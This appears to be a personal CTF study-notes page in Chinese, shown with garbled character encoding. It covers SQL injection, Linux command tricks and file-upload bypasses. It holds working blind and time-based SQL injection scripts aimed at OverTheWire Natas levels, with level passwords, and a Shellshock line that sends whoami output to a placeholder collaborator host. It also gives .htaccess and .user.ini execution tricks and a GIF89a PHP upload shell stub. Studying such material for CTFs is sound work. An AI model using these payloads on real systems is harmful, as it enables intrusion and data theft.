<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">UPDATEXML</span>(xml_data, xpath_expression, new_value)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç¤ºä¾‹</span></span><br><span class="line"><span class="attribute">time</span>=updatexml (<span class="number">1</span>,substring (concat (<span class="number">0</span>x7e,(select group_concat (schema_name) from information_schema.schemata),<span class="number">0</span>x7e),<span class="number">25</span>,<span class="number">50</span>),<span class="number">3</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>sqlæ³¨å…¥çš„æ—¶å€™ï¼Œå¦‚æœæŸ¥è¯¢è¢«æˆªæ–­ï¼Œå°±è€ƒè™‘æ˜¯å­—ç¬¦é™åˆ¶ï¼ŒæŠŠåŸå§‹æŸ¥è¯¢çš„å­—ç¬¦åˆ æ‰</li>
<li>æ ¹æ®å›æ˜¾çš„sqlè„šæœ¬ äºŒåˆ†æ³•ä¼˜åŒ– <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">auth = (<span class="string">&quot;natas15&quot;</span>, <span class="string">&quot;SdqIqBsFcz3yotlNYErZSZwblkm0lrvx&quot;</span>)</span><br><span class="line">url = <span class="string">&quot;http://natas15.natas.labs.overthewire.org/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span></span><br><span class="line">password_length = <span class="number">32</span>Â  <span class="comment"># é¢˜ç›®é»˜è®¤32ä½</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, password_length + <span class="number">1</span>):</span><br><span class="line">Â  Â  low,high = <span class="number">32</span>,<span class="number">126</span></span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">while</span> low &lt; high:</span><br><span class="line">Â  Â  Â  Â  mid = (low + high) // <span class="number">2</span></span><br><span class="line">Â  Â  Â  Â  payload = <span class="string">f&#x27;natas16&quot; and ascii(substr(password,<span class="subst">&#123;i&#125;</span>,1)) &gt; <span class="subst">&#123;mid&#125;</span> -- -&#x27;</span></span><br><span class="line">Â  Â  Â  Â  r = requests.get(url, auth=auth, params=&#123;<span class="string">&quot;username&quot;</span>: payload&#125;)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span> <span class="string">&quot;user exists&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">Â  Â  Â  Â  Â  Â  low = mid + <span class="number">1</span></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">else</span>:</span><br><span class="line">Â  Â  Â  Â  Â  Â  high = mid</span><br><span class="line">Â  Â  <span class="keyword">if</span> low == high:</span><br><span class="line">Â  Â  Â  Â  password += <span class="built_in">chr</span>(low)</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(<span class="string">f&quot;Found <span class="subst">&#123;i&#125;</span>-th character: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Final Password: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div></li>
<li>sqlæ³¨å…¥é‡Œé¢ç”¨æ—¶é—´ç›²æ³¨çš„requestsçš„è¿”å›æ—¶é—´å‡½æ•°æ˜¯<code>r.elapsed.total_seconds()</code></li>
<li>mysqlä¸­çš„likeæ˜¯å¤§å°ä¸æ•æ„Ÿçš„ å¦‚æœè¦å¤§å°å†™æ•æ„Ÿå°±è¦ç”¨ <code>like binary</code> </li>
<li>mysqlä¸­ifå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°çš„å€¼æ˜¯æ¡ä»¶ä¸æˆç«‹çš„æ—¶å€™è¿”å›çš„å€¼ æ¯”å¦‚<code>if(password like binary &quot;%&#123;i&#125;%&quot;,sleep(&#123;time&#125;),1)</code> æˆç«‹æ‰§è¡Œç¬¬äºŒä¸ªå‚æ•°ï¼Œä¸æˆç«‹æ‰§è¡Œç¬¬ä¸‰ä¸ªå‚æ•°</li>
<li>æ—¶é—´ç›²æ³¨è„šæœ¬ï¼Œå¯ä»¥å…ˆç¡®å®šæœ‰ä»€ä¹ˆå­—ç¬¦ä¼˜åŒ–ä¸€ä¸‹</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">a = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://natas17.natas.labs.overthewire.org/index.php&#x27;</span></span><br><span class="line">auth = (<span class="string">&quot;natas17&quot;</span>, <span class="string">&quot;EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC&quot;</span>)</span><br><span class="line">time = 5</span><br><span class="line"></span><br><span class="line">c = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line">sure = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line"></span><br><span class="line">Â  Â  username = f<span class="string">&#x27;natas18&quot; and if(password like binary &quot;%&#123;i&#125;%&quot;,sleep(&#123;time&#125;),1) -- -&#x27;</span></span><br><span class="line"></span><br><span class="line">Â  Â  r = requests.<span class="built_in">get</span>(<span class="attribute">url</span>=url, <span class="attribute">auth</span>=auth, params=&#123;<span class="string">&quot;username&quot;</span>: username&#125;)</span><br><span class="line"></span><br><span class="line">Â  Â  <span class="keyword">if</span> r.elapsed.total_seconds() &gt;= time:</span><br><span class="line">Â  Â  Â  Â  sure += i</span><br><span class="line">Â  Â  Â  Â  <span class="built_in">print</span>(f<span class="string">&quot;[+]password certain: &#123;i&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,33):</span><br><span class="line">Â  Â  <span class="keyword">for</span> x <span class="keyword">in</span> sure:</span><br><span class="line">Â  Â  Â  Â  username = <span class="string">&#x27;natas18&quot; and ascii(substr(passwd,&#123;i&#125;,1)) = ascii(&quot;&#123;x&#125;&quot;) and sleep(&#123;t&#125;) -- -&#x27;</span>.format(<span class="attribute">i</span>=i,x=x,t=time)</span><br><span class="line">Â  Â  Â  Â  r = requests.<span class="built_in">get</span>(<span class="attribute">url</span>=url,auth=auth,params=&#123;<span class="string">&quot;username&quot;</span>:username&#125;)</span><br><span class="line"></span><br><span class="line">Â  Â  Â  Â  <span class="keyword">if</span>(r.elapsed.total_seconds() &gt; time):</span><br><span class="line">Â  Â  Â  Â  Â  Â  a +=x</span><br><span class="line">Â  Â  Â  Â  Â  Â  <span class="built_in">print</span> (a)</span><br><span class="line">Â  Â  Â  Â  Â  Â  break</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f<span class="string">&quot;Final Password: &#123;a&#125;&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>%</code> ç¬¦å·æ˜¯ SQL ä¸­çš„é€šé…ç¬¦ï¼Œç”¨äºæ‰§è¡Œæ¨¡ç³ŠåŒ¹é…ï¼ˆç±»ä¼¼äºæ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ .*ï¼‰% ä»£è¡¨ä»»æ„é•¿åº¦çš„å­—ç¬¦ ç¤ºä¾‹<code>SELECT * FROM users WHERE username LIKE &#39;%admin%&#39;;</code>è¡¨ç¤ºåŒ¹é…ä»»ä½•åŒ…å« â€œadminâ€ çš„ username</li>
<li>mysqlä¸­çš„substrç´¢å¼•ä»1å¼€å§‹ä¸æ˜¯0 </li>
<li>sqlæŠ¥é”™æ³¨å…¥çš„<code>extractvalue</code>å’Œ<code>updatexml</code>å‡½æ•°åªèƒ½è¿”å›<code>32</code>ä¸ªå­—ç¬¦  right(),left()ï¼Œsubstr()æ¥æˆªå–å­—ç¬¦ä¸²</li>
<li>sqlæœ‰å›æ˜¾çš„æ—¶å€™ï¼Œä¸èƒ½ç”¨æ³¨é‡Šç¬¦å·çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨sqlä¸­çš„å­—ç¬¦è¿ç®—â€™usernameâ€™:â€0â€™+ascii(substr((select * from flag) from â€œ+str(i+1)+â€ for 1))+â€™0â€   <a href="https://guayu-kakeru.github.io/posts/19220.html">unfinish</a></li>
<li>å¦‚æœé€‰æ‹©æ•°æ®åº“ï¼Œå›æ˜¾å‡ºæ¥æ˜¯0è¯´æ˜å¯èƒ½æ˜¯è¿›åˆ¶æœ‰é—®é¢˜ï¼Œå¯ä»¥é€‰æ‹©ç”¨hexè½¬æˆ16è¿›åˆ¶ï¼Œä½†æ˜¯å¦‚æœæ•°æ®åº“ä¸­å¸¦æœ‰æ•°å­—æˆ–è€…å­—æ¯ä¼šå‡ºç°è‹±æ–‡ï¼Œå¦‚æœéƒ½æ˜¯æ•°å­—ï¼Œå¯èƒ½æ˜¯è‹±æ–‡è¢«è¿‡æ»¤ã€‚å¯ä»¥è€ƒè™‘æŠŠ16è¿›åˆ¶è½¬æˆ10è¿›åˆ¶ï¼Œç„¶ååœ¨æ˜¾ç¤ºå¦‚ <code>&#39;+(selselectect conv(substr(hex(database()),1,12),16,10))+ &#39;.jpg</code></li>
<li>åœ¨mysqlä¸­ï¼Œå­—ç¬¦ä¸²å’Œæ•°å­—ç±»å‹ä¹Ÿå¯ä»¥æ¯”è¾ƒï¼Œæ¯”è¾ƒä¹‹å‰å­—ç¬¦ä¸²ä¼šè½¬åŒ–æˆ0   å¯ä»¥æ„é€ payload <code>admin&#39; -0-&#39;</code> å› ä¸ºåŸå§‹æ’å…¥è¯­å¥å¯èƒ½æ˜¯<code>SELECT * FROM users WHERE username = &#39;admin&#39;-0-&#39; AND password = &#39;xxx&#39;;</code> æ’å…¥ä¹‹åå‡ºç°è¡¨è¾¾å¼0 - 0 &#x3D; 0 ç„¶åæ•°æ®åº“ä¸­ç”¨æˆ·åçš„å­—æ®µæ˜¯å­—ç¬¦ä¸²ï¼Œå’Œ0æ¯”è¾ƒä¹Ÿæ˜¯0 æ‰€ä»¥å¯ä»¥å®ç°sqlæ³¨å…¥</li>
<li>è¿‡æ»¤ç©ºæ ¼å’Œé€—å·ï¼Œè¦è¯»å–æ•°æ®å¯ä»¥ç”¨ç±»ä¼¼<code>select mid((&#39;123&#39;)from(1)for(2))</code></li>
</ul>
<h2 id="ctfä¸­çš„linux"><a href="#ctfä¸­çš„linux" class="headerlink" title="ctfä¸­çš„linux"></a>ctfä¸­çš„linux</h2><ul>
<li>nl å‘½ä»¤åœ¨Â <a href="http://codex.wordpress.org.cn/Linux">linux</a>Â ç³»ç»Ÿä¸­ç”¨æ¥è®¡ç®—æ–‡ä»¶ä¸­è¡Œå·ã€‚nlÂ å¯ä»¥å°†è¾“å‡ºçš„æ–‡ä»¶å†…å®¹è‡ªåŠ¨çš„åŠ ä¸Šè¡Œå·ï¼å…¶é»˜è®¤çš„ç»“æœä¸Â catÂ -nÂ æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼ŒÂ nlÂ å¯ä»¥å°†è¡Œå·åšæ¯”è¾ƒå¤šçš„æ˜¾ç¤ºè®¾è®¡ï¼ŒåŒ…æ‹¬ä½æ•°ä¸æ˜¯å¦è‡ªåŠ¨è¡¥é½Â 0Â ç­‰ç­‰çš„åŠŸèƒ½ã€‚ï¼ˆä¸€èˆ¬å¯¹è¾“å…¥å­—ç¬¦æœ‰é™åˆ¶çš„æ—¶å€™ç”¨</li>
<li>linuxä¸­<code>*</code>ä¼šæŠŠç›®å½•ä¸­çš„ç¬¬ä¸€ä¸ªåŒ¹é…åˆ°çš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ å‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°æ‰§è¡Œ</li>
<li>åœ¨å¤§å¤šæ•° Linux ç³»ç»Ÿä¸­ï¼ŒPHP é»˜è®¤ä¼šå°† Session æ•°æ®å­˜å‚¨åœ¨Â <code>/tmp</code>Â ç›®å½•ä¸‹ï¼Œæ–‡ä»¶åé€šå¸¸ä»¥Â <code>sess_</code>Â ä¸ºå‰ç¼€ï¼Œåè·Ÿ Session IDã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/tmp/</span>sess_abc123def456</span><br></pre></td></tr></table></figure></div>
<ul>
<li>åœ¨å•å¼•å·å­—ç¬¦ä¸²ä¸­æ’å…¥å•å¼•å·çš„åŠæ³•<code>&#39;&quot;&#39;&quot;&#39;</code><br>&emsp;åŸç†ï¼š <strong>å°†å­—ç¬¦ä¸²æ‹†åˆ†æˆå¤šæ®µ</strong>ï¼Œé€šè¿‡äº¤æ›¿ä½¿ç”¨å•å¼•å·Â <code>&#39;</code>Â å’ŒåŒå¼•å·Â <code>&quot;</code>ï¼Œé—´æ¥æ’å…¥å•å¼•å·å­—ç¬¦ã€‚å…¶å®å°±æ˜¯ä¸€ç§æ‹¼æ¥çš„å½¢å¼  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOIT"><figure class="iseeu highlight /autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># é”™è¯¯ç¤ºä¾‹ï¼Œä¼šå¯¼è‡´è§£æé”™è¯¯ echo <span class="string">&#x27;This is a &#x27;</span>test<span class="string">&#x27; string.&#x27;</span> </span></span><br><span class="line">    <span class="meta"># æ­£ç¡®ç¤ºä¾‹ echo <span class="string">&#x27;This is a &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;test&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27; string.&#x27;</span></span></span><br><span class="line">    <span class="meta">#ç­‰æ•ˆäº</span></span><br><span class="line">    <span class="string">&#x27;&lt;?php system (&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;cat fl*&#x27;</span> + <span class="string">&quot;&#x27;&quot;</span> + <span class="string">&#x27;);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></div></li>
<li>åœ¨linuxä¸­å‘½ä»¤ä¸­é—´æœ‰åˆ†éš”ç¬¦ï¼Œå•å¼•å·åŒå¼•å·åæ–œæ åå¼•å·ä¹Ÿå¯ä»¥ç…§æ ·æ‰§è¡Œå‘½ä»¤æ¯”å¦‚<code>l&#39;&#39;s l&quot;&quot;s l\s l``s</code></li>
<li>shellshockæ¼æ´:ï¼ŒBash <strong>åœ¨è§£æç¯å¢ƒå˜é‡æ—¶å­˜åœ¨æ¼æ´</strong>ï¼Œå¦‚æœç¯å¢ƒå˜é‡çš„å€¼ä»¥ <code>()</code> å¼€å¤´å¹¶å¸¦æœ‰ <strong>é¢å¤–çš„å‘½ä»¤</strong>ï¼ŒBash ä¼š<strong>åœ¨è§£ææ—¶æ‰§è¡Œè¿™äº›å‘½ä»¤</strong>ï¼Œå³ä½¿å®ƒä»¬ä¸åœ¨å‡½æ•°ä½“å†…ã€‚</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">()&#123; :; &#125;; <span class="regexp">/usr/</span>bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN</span><br></pre></td></tr></table></figure></div>
<p>é€šè¿‡ HTTP è¯·æ±‚ä¸­çš„ User-Agentã€Refererã€Cookie ç­‰ Header æ³¨å…¥æ¶æ„ç¯å¢ƒå˜é‡</p>
<ul>
<li>linuxä¸­çš„macåœ°å€åœ¨<code>/sys/class/net/eth0/address</code>  å¦‚æœç”¨macåœ°å€ä½œä¸ºéšæœºç§å­ï¼Œè¦å»æ‰å†’å·ï¼Œç„¶ååŠ ä¸Š0xå˜æˆåå…­è¿›åˆ¶ï¼Œå› ä¸ºéšæœºç§å­ä¸€èˆ¬æ˜¯1ä½</li>
<li>nginxé…ç½®æ–‡ä»¶åœ¨<code>/usr/local/nginx/conf/nginx.conf</code></li>
<li><code>find / -name &#39;*&#39; -exec grep -H &#39;NSS&#39; &#123;&#125; \; 2&gt;/dev/null</code> è—flagçš„æ—¶å€™è¿™ä¹ˆæ‰¾æ‰€æœ‰çš„</li>
<li>è¿‡æ»¤ç©ºæ ¼å¯ä»¥ä½¿ç”¨<code>cat&lt;/flag</code>å¾—åˆ°flag é‡å®šå‘ä¹Ÿå¯ä»¥å†™æˆ<code>&amp;amp;lt;</code></li>
</ul>
<h2 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h2><ul>
<li><code>php3ï¼Œphp5ï¼Œphtï¼Œphtmlï¼Œphps</code> éƒ½æ˜¯ php å¯è¿è¡Œçš„æ–‡ä»¶æ‰©å±•å ä¸‹é¢æ˜¯æ‰©å±•åè¡¨<table>
<thead>
<tr>
<th align="left">è¯­è¨€</th>
<th align="left">å¯è§£æåç¼€</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>ASP&#x2F;ASPX</strong></td>
<td align="left"><code>asp</code>, <code>aspx</code>, <code>asa</code>, <code>ascx</code>, <code>ashx</code>, <code>asmx</code>, <code>cer</code>, <code>cdx</code></td>
</tr>
<tr>
<td align="left"><strong>PHP</strong></td>
<td align="left"><code>php</code>, <code>php5</code>, <code>php4</code>, <code>php3</code>, <code>phtml</code>, <code>pht</code></td>
</tr>
<tr>
<td align="left"><strong>JSP</strong></td>
<td align="left"><code>jsp</code>, <code>jspx</code>, <code>jspa</code>, <code>jsw</code>, <code>jsv</code>, <code>jspf</code>, <code>jtml</code></td>
</tr>
</tbody></table>
</li>
<li><code>.htaccess</code> æ˜¯ä¸€ä¸ªçº¯æ–‡æœ¬æ–‡ä»¶ï¼Œå®ƒé‡Œé¢å­˜æ”¾ç€ Apache æœåŠ¡å™¨é…ç½®ç›¸å…³çš„æŒ‡ä»¤ã€‚<br> .htaccess ä¸»è¦çš„ä½œç”¨æœ‰ï¼šURL é‡å†™ã€è‡ªå®šä¹‰é”™è¯¯é¡µé¢ã€MIME ç±»å‹é…ç½®ä»¥åŠè®¿é—®æƒé™æ§åˆ¶ç­‰ã€‚ä¸»è¦ä½“ç°åœ¨ä¼ªé™æ€çš„åº”ç”¨ã€å›¾ç‰‡é˜²ç›—é“¾ã€è‡ªå®šä¹‰ 404 é”™è¯¯é¡µé¢ã€é˜»æ­¢ &#x2F; å…è®¸ç‰¹å®š IP&#x2F;IP æ®µã€ç›®å½•æµè§ˆä¸ä¸»é¡µã€ç¦æ­¢è®¿é—®æŒ‡å®šæ–‡ä»¶ç±»å‹ã€æ–‡ä»¶å¯†ç ä¿æŠ¤ç­‰ã€‚<br> .htaccess çš„ç”¨é€”èŒƒå›´ä¸»è¦é’ˆå¯¹å½“å‰ç›®å½•ã€‚  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line">   <span class="comment"># jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶</span></span><br><span class="line">   <span class="section">&lt;FilesMatch <span class="string">&quot;\.jpg$&quot;</span>&gt;</span></span><br><span class="line"><span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure></div></li>
<li>åœ¨ php ä¸­ <code>&quot;.user.ini&quot;</code> æœ‰å¦‚ä¸‹è§£é‡Šï¼šphp ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æœå¯»æ–‡ä»¶åï¼Œå¦‚æœè®¾å®šä¸ºç©ºå­—ç¬¦ä¸²åˆ™ php ä¸ä¼šæœå¯»ï¼Œä¹Ÿå°±æ˜¯åœ¨ â€œ.user.iniâ€ ä¸­å¦‚æœè®¾ç½®äº†æ–‡ä»¶    åï¼Œé‚£ä¹ˆä»»æ„ä¸€ä¸ªé¡µé¢éƒ½å°†è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹åŒ…å«è¿›å»ã€‚æœ‰ä¸¤ç§æ–¹æ³•ï¼š<br> auto_prepend_file: åœ¨é¡µé¢é¡¶éƒ¨åŠ è½½æ–‡ä»¶<br> auto_append_file: åœ¨é¡µé¢åº•éƒ¨åŠ è½½æ–‡ä»¶<br> è€Œä¸”è¿™ç§æ–¹å¼è§£æçš„æ–‡ä»¶éƒ½ä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œï¼Œåœ¨ä¸€äº›æ–‡ä»¶ä¸Šä¼ é¢˜ç›®ä¹Ÿä¼šç¢°åˆ°</li>
<li>å¦‚æœç¯å¢ƒæ”¯æŒ<code>ä¼ªåè®®</code>ï¼Œç”¨<code>user.ini</code>ä¹Ÿå¯ä»¥åŒ…å«ä¼ªåè®®</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.user</span><span class="selector-class">.ini</span></span><br><span class="line">auto_append_file=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/6842ed1d58cb8da5c83744fe.png"><br>è¿˜å¯ä»¥åŒ…å«æ—¥å¿—æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">nginx</span><br><span class="line">auto_prepend_file = <span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>åœ¨æ–‡ä»¶å†…å®¹çš„å¼€å¤´è¾“å…¥ <code>GIF89a</code> ä¸»è¦ç”¨äºç»•è¿‡ <strong>MIME ç±»å‹æ£€æµ‹</strong> å’Œ <strong>Web æœåŠ¡å™¨çš„æ–‡ä»¶æ ¼å¼éªŒè¯</strong>ï¼Œåœ¨æœ‰æ£€æµ‹ä¸Šä¼ æ–‡ä»¶ç±»å‹çš„é¢˜ç›®ä¸­å¯ä»¥åœ¨ä¿®æ”¹æˆjpgæ–‡ä»¶çš„å‰é¢åŠ ä¸Šè¿™å¥ æ–‡ä»¶å¤´æ£€æµ‹ï¼š <table>
<thead>
<tr>
<th align="left">æ–‡ä»¶ç±»å‹</th>
<th align="left">åç¼€</th>
<th align="left">æ–‡ä»¶å¤´ (Hex)</th>
<th align="left">æ–‡ä»¶å°¾ (Hex)</th>
<th align="left">æ ‡å¿—</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>JPEG</strong></td>
<td align="left">.jpg&#x2F;.jpeg</td>
<td align="left"><code>FFD8FF</code></td>
<td align="left"><code>FFD9</code></td>
<td align="left">JFIF</td>
</tr>
<tr>
<td align="left"><strong>PNG</strong></td>
<td align="left">.png</td>
<td align="left"><code>89504E47</code></td>
<td align="left"><code>AE426082</code></td>
<td align="left">PNG IEND IHDR</td>
</tr>
<tr>
<td align="left"><strong>GIF</strong></td>
<td align="left">.gif</td>
<td align="left"><code>47494638</code></td>
<td align="left"><code>003B</code></td>
<td align="left">GIF89a &#x2F; GIF87a</td>
</tr>
<tr>
<td align="left"><strong>TIFF</strong></td>
<td align="left">.tif&#x2F;.tiff</td>
<td align="left"><code>49492A00</code></td>
<td align="left"><code>4D4D2A00</code></td>
<td align="left">- II MM</td>
</tr>
</tbody></table>
</li>
<li>æ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®å¦‚æœå¯¹æ–‡ä»¶çš„ç±»å‹æœ‰æ£€æµ‹å°±è¦ä¿®æ”¹<code>MIME</code>å°±æ˜¯content-type æ¯”å¦‚<code>image/jpeg</code></li>
<li>å¦‚æœæ˜¯æ–‡ä»¶ä¸Šä¼ é¢˜å¯¹å›¾ç‰‡çš„å®½å’Œé«˜æœ‰è¦æ±‚ï¼Œå°è¯•åœ¨æœ¨é©¬æ–‡ä»¶ä¸Šé¢è‡ªå·±å®šä¹‰å®½å’Œé«˜  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> height 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> width 1</span></span><br></pre></td></tr></table></figure></div></li>
<li><code>ApacheÂ è§£ææ¼æ´</code>ä¸»è¦æ˜¯å› ä¸º Apache é»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªç”¨ã€‚åˆ†å‰²å¾—åç¼€ï¼Œå½“æœ€å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«ï¼ˆmime.types æ–‡ä»¶ä¸­çš„ä¸ºåˆæ³•åç¼€ï¼‰åˆ™ç»§ç»­å‘å·¦çœ‹ï¼Œç›´åˆ°ç¢°åˆ°åˆæ³•åç¼€æ‰è¿›è¡Œè§£æï¼ˆä»¥æœ€åä¸€ä¸ªåˆæ³•åç¼€ä¸ºå‡†ï¼‰ åœ¨ä¸€äº›æ–‡ä»¶ä¸Šä¼ é—®é¢˜ä¸­å¯èƒ½å‡ºç°è¿™ä¸ªé—®é¢˜  æ‰€ä»¥å¦‚æœé»‘åå•æ¯”è¾ƒç®€å•ï¼Œåç¼€ååªçœ‹ä»ç¬¬ä¸€ä¸ª.å¼€å§‹ï¼Œå°±å¯ä»¥ä¸Šä¼ ç±»ä¼¼1.php.aaaè¿™æ ·çš„æ–‡ä»¶</li>
<li><code>apache æ¢è¡Œè§£ææ¼æ´</code><br>  å½±å“èŒƒå›´ï¼š2.4.0-2.4.29 ç‰ˆæœ¬<br>åŸå› ï¼šåˆæ³•åç¼€é…ç½®æ–‡ä»¶ä¸­çš„æ­£åˆ™è¡¨è¾¾å¼ä¸­ $ ä¸ä»…åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ä½ç½®ï¼Œè¿˜å¯ä»¥åŒ¹é… \n æˆ– \rï¼Œåœ¨è§£æ php æ—¶ï¼Œ1.php\x0A å°†æŒ‰ç…§.php è¿›è¡Œè§£æï¼Œè€Œâ€™.php\x0Aâ€™ !&#x3D; â€˜.phpâ€™, å¯èƒ½è¿‡æ»¤æ—¶è¿‡æ»¤äº†.php ä½†æ²¡æœ‰è¿‡æ»¤.php\x0A ä»è€Œå®ç°ç»•è¿‡ã€‚é…ç½®æ–‡ä»¶ï¼šè¿‡æ»¤åç¼€å.phpapache 2.4.7 æ— æ³•ä¸Šä¼  hhh.php, ä¸Šä¼  hhh.php.xxx å¯ä»¥ç»•è¿‡ã€‚</li>
<li><code>iis6.0</code> çš„ ä¸¤ç§è§£ææ¼æ´ï¼š 1.ç›®å½•è§£æï¼š ä»¥*.aspå‘½åçš„æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶éƒ½å°†ä¼šè¢«å½“æˆASPæ–‡ä»¶æ‰§è¡Œã€‚ 2.æ–‡ä»¶è§£æï¼š *.asp;.jpgÂ åƒè¿™ç§ç•¸å½¢æ–‡ä»¶ååœ¨â€œï¼›â€åé¢çš„ç›´æ¥è¢«å¿½ç•¥ï¼Œä¹Ÿå°±æ˜¯è¯´å½“æˆ *.aspæ–‡ä»¶æ‰§è¡Œã€‚</li>
<li>åŒåç¼€ç»•è¿‡æ–‡ä»¶ä¸Šä¼ é™åˆ¶çš„æ—¶å€™ï¼Œgifå¯ä»¥åœ¨æ–‡ä»¶å¤´å†™GIF89aç„¶åæ’å…¥phpä»£ç ï¼Œgifè¿™ä¸ªåç¼€åæœ‰æ—¶å€™ä¼šæ‰§è¡Œphpæ–‡ä»¶</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">  GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php reverse shell</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>åœ¨ä¸€äº›æƒ…å†µï¼Œæ–‡ä»¶çš„åç¼€è¢«ç™½åå•é™åˆ¶æ­»ï¼Œä½†æ˜¯<code>æ–‡ä»¶åè¢«ä¿å­˜åˆ°æœåŠ¡å™¨ä¸­</code>ï¼Œç„¶åå‰ç«¯ä»æ•°æ®åº“ä¸­è·å–æ–‡ä»¶åï¼Œå¯èƒ½é€ æˆsqlæ³¨å…¥ å°è¯•ä¸Šä¼ select.jpg</li>
